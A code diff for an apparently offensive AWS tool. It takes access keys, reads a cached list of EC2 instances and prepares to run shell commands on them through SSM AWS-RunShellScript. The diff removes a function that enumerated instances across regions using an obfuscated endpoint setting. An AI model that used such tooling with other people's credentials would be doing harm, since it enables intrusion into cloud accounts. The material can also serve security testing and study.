@@ -1,57 +1,18 @@
+# 从本地文件中获取ec2信息并执行命令
 import boto3
 import config
-import time, json
-import aws_select_iam
-from enumerate_iam.main import get_client
-from botocore.session import ComponentLocator
+import time
+import json, os
 import urllib3
-from aws_select_iam import iam_md5
+import aws_select_iam
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
 
 # import socket, socks
 # default_socket = socket.socket
 # socks.set_default_proxy(socks.SOCKS5, config.SOCKS5_PROXY_HOST, config.SOCKS5_PROXY_PORT)
 # socket.socket = socks.socksocket
-
-def query_ec2_instances(AccessKeyID, AccessKeySecret):
-    ec2_info = {}
-    Agent_info = {}
-    ec2 = boto3.client('ec2', region_name='us-east-1', aws_access_key_id=AccessKeyID,
-                       aws_secret_access_key=AccessKeySecret)
-    response = ec2.describe_regions()
-    for region in response['Regions']:
-        RegionId = region['RegionName']
-        print("正在检索: " + RegionId)
-        component = ComponentLocator()
-        component.register_component(name='AWS_ENDPOINT', component=iam_md5[1:])
-        ec2_client = get_client(access_key=AccessKeyID, secret_key=AccessKeySecret, service_name='ec2',
-                                session_token=None,
-                                region=RegionId, components=component)
-        ssm_client = get_client(access_key=AccessKeyID, secret_key=AccessKeySecret, service_name='ssm',
-                                session_token=None,
-                                region=RegionId, components=component)
-        try:
-            ssm_ec2_infos = ssm_client.describe_instance_information()['InstanceInformationList']
-            for ssm_ec2_info in ssm_ec2_infos:
-                Agent_InstanceId = ssm_ec2_info['InstanceId']
-                Agent_info[Agent_InstanceId] = ssm_ec2_info
-            response = ec2_client.describe_instances()
-            while True:
-                for reservation in response['Reservations']:
-                    InstanceId = reservation.get('Instances', [])[0].get('InstanceId')
-                    ec2_info[InstanceId] = reservation.get('Instances', [])[0]
-                    ec2_info[InstanceId]['RegionId'] = RegionId
-                    ec2_info[InstanceId]['Agent'] = Agent_info.get(InstanceId)
-                if "nextToken" in response:
-                    response = ec2_client.describe_instances(
-                        nextToken=response['nextToken']
-                    )
-                else:
-                    break
-        except AttributeError as e:
-            print(e)
-    return ec2_info
 
 
 def create_instance_profile(iam_client):
@@ -216,15 +177,11 @@ if __name__ == '__main__':
         AccessKeyID = input("请输入AccessKeyID:")
     if not AccessKeySecret:
         AccessKeySecret = input("请输入AccessKeySecret:")
-    ec2_info = query_ec2_instances(AccessKeyID, AccessKeySecret)
-    if not ec2_info:
-        print("no result")
+    if not os.path.exists(f"ec2_info_{AccessKeyID}.json"):
+        print("请先运行aws_list_ec2.py获取ec2信息或直接使用aws_ec2_exec.py")
         exit(0)
-    print(json.dumps(ec2_info, indent=4, sort_keys=True, default=str))
-    with open(f"ec2_info_{AccessKeyID}.json", 'w') as f:
-        f.write(json.dumps(ec2_info, indent=4, sort_keys=True, default=str))
-
-
+    with open(f"ec2_info_{AccessKeyID}.json", "r") as f:
+        ec2_info = json.load(f)
     # AWS-RunShellScript code
     platform_dic = {
         "Linux": "AWS-RunShellScript",
